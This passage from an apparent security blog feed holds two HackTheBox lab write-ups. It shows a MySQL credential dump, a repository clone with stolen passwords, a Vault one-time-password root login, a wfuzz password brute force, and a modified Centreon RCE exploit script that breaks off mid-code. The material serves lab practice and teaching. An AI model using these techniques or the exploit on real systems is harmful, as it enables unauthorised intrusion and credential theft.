class="string">&#x27;qLGockJ6G2J75O&#x27;</span></span><br><span class="line">MYSQL_DATABASE_DB = <span class="string">&#x27;craft&#x27;</span></span><br><span class="line">MYSQL_DATABASE_HOST = <span class="string">&#x27;db&#x27;</span></span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = False</span><br></pre></td></tr></table></figure><p>We got the database credentials. Let’s try to dump it for juicy informations:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/opt/app <span class="comment"># mysql</span></span><br><span class="line">/bin/sh: mysql: not found</span><br></pre></td></tr></table></figure><p>Of course, in this jail no <code>mysql</code> available either… Earlier I noticed a database test script. We will edit and use this python script since nothing else is available. </p><p>First, let’s list the tables :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">from</span> craft_api <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,</span><br><span class="line">                             user=settings.MYSQL_DATABASE_USER,</span><br><span class="line">                             password=settings.MYSQL_DATABASE_PASSWORD,</span><br><span class="line">                             db=settings.MYSQL_DATABASE_DB,</span><br><span class="line">                             cursorclass=pymysql.cursors.DictCursor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        sql = <span class="string">&quot;SELECT table_name FROM information_schema.tables;&quot;</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        result = cursor.fetchall()</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(row)</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    connection.close()</span><br></pre></td></tr></table></figure><p>Running this script will return two tables: <code>brew</code> and <code>users</code>. </p><p>Let’s list the users by editing the <code>dbtest.py</code> script :</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- sql = &quot;SELECT table_name FROM information_schema.tables;&quot;</span></span><br><span class="line"><span class="addition">+ sql = &quot;SELECT * FROM user;&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/opt/app <span class="comment"># python dbtest.py</span></span><br><span class="line">&#123;<span class="string">&#x27;id&#x27;</span>: 1, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;dinesh&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;4aUh0A8PbVJxgd&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;id&#x27;</span>: 4, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;ebachman&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;llJ77D8QFkLPQB&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;id&#x27;</span>: 5, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;gilfoyle&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;ZEU3N8WNM2rh4T&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>Good, a few users with plain-text passwords. Unfortunately none works on SSH…</p><p>So what remains? Let’s go back to the Gogs instance. Login as <code>gilfoyle</code> gives us access to a very interesting private repository:</p><p><img src="https://user-images.githubusercontent.com/9076747/67162678-94318d80-f366-11e9-9377-04c310d8654a.png" alt="Craft Infra Repository"></p><p>Let’s clone it to explore:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ GIT_SSL_NO_VERIFY=<span class="literal">true</span> git <span class="built_in">clone</span> https://gilfoyle:ZEU3N8WNM2rh4T@gogs.craft.htb/gilfoyle/craft-infra.git</span><br></pre></td></tr></table></figure><p>First thing that catches the eye is the <code>.ssh</code> folder containing both the public and private key. We should be able to use to login as <code>gilfoyle</code> through SSH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ chmod 600 .ssh/id_rsa</span><br><span class="line">[hg8@archbook ~]$ ssh gilfoyle@craft.htb -i id_rsa</span><br><span class="line"></span><br><span class="line">  .   *   ..  . *  *</span><br><span class="line">*  * @()Ooc()*   o  .</span><br><span class="line">    (Q@*0CG*O()  ___</span><br><span class="line">   |\_________/|/ _ \</span><br><span class="line">   |  |  |  |  | / | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | \_| |</span><br><span class="line">   |  |  |  |  |\___/</span><br><span class="line">   |\_|__|__|_/|</span><br><span class="line">    \_________/</span><br><span class="line"></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>:</span><br><span class="line">Linux craft.htb 4.9.0-8-amd64 <span class="comment">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span></span><br><span class="line"></span><br><span class="line">Last login: Sun Oct 20 06:26:05 2019 from 10.10.15.50</span><br><span class="line">gilfoyle@craft:~$</span><br></pre></td></tr></table></figure><p>A passphrase is needed for the <code>id_rsa</code> key, fortunately we have a case of password reuse and the password <code>ZEU3N8WNM2rh4T</code> found in the database dump is valid.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ cat user.txt</span><br><span class="line">bxxxxxxxxxxxxxxxxxxxxxxx4</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>On user <code>gilfoyle</code> nothing particularly catch the eye and the box seems well configured. </p><p>Upon more enumeration we still notice an uncommon ssh configuration :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ cat /etc/ssh/sshd_config</span><br><span class="line">[...]</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>It looks like our entry door for root flag will be through SSH.</p><p>Inspecting files in the home directory also shows a token that might be useful:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ ls -a</span><br><span class="line">.  ..  .bashrc    .config  .gnupg  .profile  .ssh  user.txt  .vault-token  .viminfo</span><br><span class="line">gilfoyle@craft:~$ cat .vault-token</span><br><span class="line">f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9</span><br></pre></td></tr></table></figure><p>We notice this is about Vault again, we saw it already mentioned in the <code>craft-infra</code> repository. Let’s dig that way.</p><p>I didn’t know anything about Vault at the time so I checked their website :</p><blockquote><p>Vault is a tool for secrets management, encryption as a service, and privileged access management.<br><a href="https://www.vaultproject.io/">https://www.vaultproject.io/</a></p></blockquote><p>That sounds really interesting for what we need…</p><h3 id="Exploiting-Vault-for-SSH-root-password"><a href="#Exploiting-Vault-for-SSH-root-password" class="headerlink" title="Exploiting Vault for SSH root password"></a>Exploiting Vault for SSH root password</h3><p>If we put all the puzzle pieces together it seems like this tool is storing either the <code>root</code> account SSH password or a way to access the <code>root</code> account.</p><p>The file <code>craft-infra/src/master/vault/secrets.sh</code> on the <code>craft-infra</code> repository looks promising :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set up vault secrets backend</span></span><br><span class="line"></span><br><span class="line">vault secrets <span class="built_in">enable</span> ssh</span><br><span class="line"></span><br><span class="line">vault write ssh/roles/root_otp \</span><br><span class="line">    key_type=otp \</span><br><span class="line">    default_user=root \</span><br><span class="line">    cidr_list=0.0.0.0/0</span><br></pre></td></tr></table></figure><p>It confirms that Vault is used for ssh access to root. <code>key_type=otp</code> seems to mean that it’s working as a one-time password mechanism.</p><p>After a bit of Googling we find this documentation on Vault:</p><blockquote><p>The One-Time SSH Password (OTP) SSH secrets engine type allows a Vault server to issue a One-Time Password every time a client wants to SSH into a remote host using a helper command on the remote host to perform verification.<br><a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html</a></p></blockquote><p>Alright, we have all the needed information. Let’s generate a One-Time Password for the root account!</p><p>From here I will follow the documentation linked above. First we need to mount the secrets engine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault secrets <span class="built_in">enable</span> ssh</span><br><span class="line">Successfully mounted <span class="string">&#x27;ssh&#x27;</span> at <span class="string">&#x27;ssh&#x27;</span>!</span><br></pre></td></tr></table></figure><p>Then we create a role with the <code>key_type</code> parameter set to <code>otp</code>. I will use the same command than the one in <code>craft-infra/src/master/vault/secrets.sh</code> to make sure we are not missing anything:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault write ssh/roles/root_otp \</span><br><span class="line">     key_type=otp \</span><br><span class="line">     default_user=root \</span><br><span class="line">     cidr_list=0.0.0.0/0</span><br><span class="line">Success! Data written to: ssh/roles/root_otp</span><br></pre></td></tr></table></figure><p>Last step we create an OTP credential for an IP of the remote host that belongs to <code>otp_key_role</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=10.10.10.110</span><br><span class="line">Key                Value</span><br><span class="line">---                -----</span><br><span class="line">lease_id           ssh/creds/root_otp/15c8d88c-4e1a-6ec6-4cbb-616cf25e1a7d</span><br><span class="line">lease_duration     768h</span><br><span class="line">lease_renewable    <span class="literal">false</span></span><br><span class="line">ip                 10.10.10.110</span><br><span class="line">key                3d32eb8a-61b1-3376-4402-dd15e72206f8</span><br><span class="line">key_type           otp</span><br><span class="line">port               22</span><br><span class="line">username           root</span><br></pre></td></tr></table></figure><p>Seems like everything went fine. Let’s launch a new terminal and try to login as <code>root</code> :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh root@craft.htb</span><br><span class="line"></span><br><span class="line">  .   *   ..  . *  *</span><br><span class="line">*  * @()Ooc()*   o  .</span><br><span class="line">    (Q@*0CG*O()  ___</span><br><span class="line">   |\_________/|/ _ \</span><br><span class="line">   |  |  |  |  | / | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | \_| |</span><br><span class="line">   |  |  |  |  |\___/</span><br><span class="line">   |\_|__|__|_/|</span><br><span class="line">    \_________/</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">Linux craft.htb 4.9.0-8-amd64 <span class="comment">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span></span><br><span class="line"></span><br><span class="line">Last login: Sun Oct 20 06:10:03 2019 from 127.0.0.1</span><br><span class="line">root@craft:~<span class="comment"># cat root.txt</span></span><br><span class="line">8xxxxxxxxxxxxxxxxxxx1</span><br></pre></td></tr></table></figure><hr><p>This box was really a fun time and my favorite so far. As always do not hesitate to contact me for any questions or feedback.</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> python </tag>
            
            <tag> git </tag>
            
            <tag> craft </tag>
            
            <tag> gogs </tag>
            
            <tag> api </tag>
            
            <tag> flask </tag>
            
            <tag> eval </tag>
            
            <tag> vault </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Wall</title>
      <link href="/posts/wall/"/>
      <url>/posts/wall/</url>
      
        <content type="html"><![CDATA[<img width="582" alt="wall-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158757-0da44680-988a-11ea-8a4f-5a2fb2ff79fb.png"><p>Wall was an interesting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out.</p><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.157 wall.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic nmap scan:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC wall.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-28 16:25 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> wall.htb (10.10.10.157)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.37 seconds</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 80 and the ssh port 22 open.</p><p>Opening <a href="http://wall.htb/">http://wall.htb</a> display the Apache2 Ubuntu Default Page as <code>nmap</code> told us:</p><p><img src="https://user-images.githubusercontent.com/9076747/67693154-8bae0800-f9a1-11e9-995d-b2fb18a8a970.png" alt="Wall website"></p><p>The source code of the page do not reveal any sneaky hidden code so let’s move on.</p><p>We launch <code>gobuster</code> to see if we can find interresting files and/or directories :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u http://wall.htb/ -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htaccess.php (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htpasswd.php (Status: 403)</span><br><span class="line">/aa.php (Status: 200)</span><br><span class="line">/monitoring (Status: 401)</span><br><span class="line">/panel.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br></pre></td></tr></table></figure><p>Two files looks interesting here : <code>aa.php</code> and <code>panel.php</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http wall.htb/aa.php</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Length: 1</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Date: Mon, 28 Oct 2019 15:48:45 GMT</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ http wall.htb/panel.php</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Length: 26</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Date: Mon, 28 Oct 2019 15:49:13 GMT</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Just a <span class="built_in">test</span> <span class="keyword">for</span> php file !</span><br></pre></td></tr></table></figure><p>Hum we do not have too much informations here. <code>/monitoring</code> and <code>/server-status</code> prompt Basic Auth.</p><p>From here we didn’t make a lot of progress. Trying to brute-force the Basic Auth of <code>/monitoring</code> and <code>/server-status</code> doesn’t gives results. We don’t even have any particular informations on the two php files.<br>After getting into rabbit holes for a few times I decided to try different HTTP Method on the php endpoints with a simple command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="keyword">for</span> method <span class="keyword">in</span> GET HG8 POST PUT PATCH DELETE OPTIONS TRACE CONNECT; <span class="keyword">do</span></span><br><span class="line">&gt; <span class="built_in">echo</span> <span class="string">&quot;\n<span class="variable">$method</span>:&quot;</span></span><br><span class="line">&gt; curl -X <span class="variable">$method</span> http://wall.htb/aa.php</span><br><span class="line">&gt; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>No interresting results, neither on <code>panel.php</code>. Out of despair I decide to try on the <code>/monitoring</code> endpoint. And finally:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="keyword">for</span> method <span class="keyword">in</span> GET HG8 POST PUT PATCH DELETE OPTIONS TRACE CONNECT; <span class="keyword">do</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;\n<span class="variable">$method</span>:&quot;</span></span><br><span class="line">   curl -X <span class="variable">$method</span> http://wall.htb/monitoring/</span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">[...]</span><br><span class="line">POST:</span><br><span class="line">&lt;h1&gt;This page is not ready yet !&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;We should redirect you to the required page !&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;0; URL=&#x27;/centreon&#x27;&quot;</span> /&gt;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Interresting, the <code>/centreon</code> endpoint slipped from the <code>gobuster</code> enumeration. Maybe a bigger wordlist might have discovered it. For future references I add this endpoint to the wordlist I use the most :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> centreon &gt;&gt; ~/SecLists/Discovery/Web-Content/big.txt</span><br></pre></td></tr></table></figure><p>We got our initial foothold. Opening the page show the classical Centreon login page :</p><p><img src="https://user-images.githubusercontent.com/9076747/67695628-ab472f80-f9a5-11e9-8047-3febc7e9a9a9.png" alt="Wall Centreon login page"></p><p>For reference :</p><blockquote><p>Centreon is a network, system, applicative supervision and monitoring tool<br><a href="https://www.centreon.com/">https://www.centreon.com</a></p></blockquote><p>The login page display the version number: <code>v. 19.04.0</code>. Searching for exploits on this version we found a Remote Code Execution vulnerability:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ getsploit centreon</span><br><span class="line">Total found exploits: 10</span><br><span class="line">Web-search URL: https://vulners.com/search?query=bulletinFamily%3Aexploit+AND+centreon</span><br><span class="line"></span><br><span class="line">Centreon 19.04  - Remote Code | https://vulners.com/exploitdb/EDB-ID:47069</span><br></pre></td></tr></table></figure><p>Unfortunately this is a Authenticated RCE and we have no way to bypass authentication. Since we don’t have any clues, let’s try to bruteforce with user <code>admin</code>.</p><p>To avoid the struggle of <code>centreon</code> token on the login page we will use the Centreon API instead. The documentation is available on the <a href="https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html#authentication">Centreon documentation</a>.</p><p>I like to use <a href="https://github.com/berzerk0/Probable-Wordlists">Probable-Wordlists</a> instead of the classic <code>rockyou.txt</code> that countains too much garbages:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top304Thousand-probable-v2.txt</span><br><span class="line">2019-10-28 17:38:52 (15.4 MB/s) - ‘Top304Thousand-probable-v2.txt’ saved [2811012/2811012]</span><br><span class="line">[hg8@archbook ~]$ wfuzz -z file,Top304Thousand-probable-v2.txt -d <span class="string">&quot;username=admin&amp;password=FUZZ&quot;</span> --hc 403 http://wall.htb/centreon/api/index.php\?action\=authenticate</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.1 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://wall.htb/centreon/api/index.php?action=authenticate</span><br><span class="line">Total requests: 303872</span><br><span class="line"></span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">===================================================================</span><br><span class="line"></span><br><span class="line">000000048:   200        0 L      1 W      61 Ch       <span class="string">&quot;password1&quot;</span>                                                                                                                                                                                                                                                                        ^C</span><br></pre></td></tr></table></figure><p>We now have the credentials, let’s login and try to execute the exploit. The exploit author wrote a <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">blog post</a> explaining in detail the issue and how the exploit work. It’s a very useful ressource to tweak the exploit to make it working on this box.</p><p>I had to tweak a few lines to make it work it work properly on that box, my final script was :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=UserWarning, module=<span class="string">&#x27;bs4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://wall.htb/centreon&quot;</span></span><br><span class="line">username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">password = <span class="string">&quot;password1&quot;</span></span><br><span class="line">ip = <span class="string">&quot;10.10.10.10&quot;</span></span><br><span class="line">port = <span class="number">8585</span></span><br><span class="line"></span><br><span class="line">command = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">request = requests.session()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Retrieving CSRF token to submit the login form&quot;</span>)</span><br><span class="line">page = request.get(url+<span class="string">&quot;/index.php&quot;</span>)</span><br><span class="line">html_content = page.text</span><br><span class="line">soup = BeautifulSoup(html_content, features=<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">token = soup.findAll(<span class="string">&#x27;input&#x27;</span>)[<span class="number">3</span>].get(<span class="string">&quot;value&quot;</span>)</span><br><span class="line"></span><br><span class="line">login_info = &#123;</span><br><span class="line">    <span class="string">&quot;useralias&quot;</span>: username,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">    <span class="string">&quot;submitLogin&quot;</span>: <span class="string">&quot;Connect&quot;</span>,</span><br><span class="line">    <span class="string">&quot;centreon_token&quot;</span>: 